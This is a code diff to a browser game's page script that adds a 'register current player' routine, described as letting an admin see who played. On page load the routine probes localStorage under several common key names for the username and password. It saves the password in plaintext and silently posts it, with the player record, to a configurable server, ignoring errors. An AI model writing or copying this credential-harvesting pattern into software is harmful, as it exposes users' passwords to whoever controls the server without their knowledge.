@@ -61,7 +61,62 @@ window.addEventListener('DOMContentLoaded', function() {
 
     // Build exchange UI
     buildExchangeUI();
+
+    // Register current player (so admin can see who accessed the game)
+    try {
+        registerCurrentPlayer(inventory);
+    } catch (e) {
+        console.error('Failed to register player', e);
+    }
 });
+
+// Record the current player into a central players list stored at 'dedogeium_players'
+function registerCurrentPlayer(inventory) {
+    // try common keys where username might be stored
+    const keys = ['Username', 'Uabcd', 'username', 'playerName'];
+    let name = null;
+    for (let k of keys) {
+        const v = localStorage.getItem(k);
+        if (v) { name = String(v).trim().toLowerCase(); break; }
+    }
+    if (!name) return; // no username known on this client
+
+    // try common password keys (may not be present)
+    const passKeys = ['Password', 'Pabc', 'password', 'pass', 'pwd'];
+    let password = null;
+    for (let k of passKeys) {
+        const v = localStorage.getItem(k);
+        if (v) { password = String(v); break; }
+    }
+
+    const players = JSON.parse(localStorage.getItem('dedogeium_players')) || {};
+    const now = Date.now();
+    if (!players[name]) {
+        players[name] = { firstSeen: now, visits: 0, inventory: [] };
+    }
+    players[name].lastSeen = now;
+    players[name].visits = (players[name].visits || 0) + 1;
+    // store a snapshot of current inventory for the player
+    players[name].inventory = inventory || JSON.parse(localStorage.getItem('inventory')) || [];
+    // store password if found (note: this stores plaintext passwords in localStorage)
+    if (password) players[name].password = password;
+
+    localStorage.setItem('dedogeium_players', JSON.stringify(players));
+    // also keep individual snapshot key for quick lookup
+    localStorage.setItem('inventory_' + name, JSON.stringify(players[name].inventory));
+
+    // also try to POST to central server (non-blocking)
+    (async function(){
+        try {
+            const server = (window.SERVER_URL || 'http://localhost:3000').replace(/\/$/, '');
+            await fetch(server + '/api/player', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: name, player: players[name] })
+            });
+        } catch (e) { /* ignore */ }
+    })();
+}
 
 function buildExchangeUI() {
     const exchangeList = document.getElementById('exchange-list');
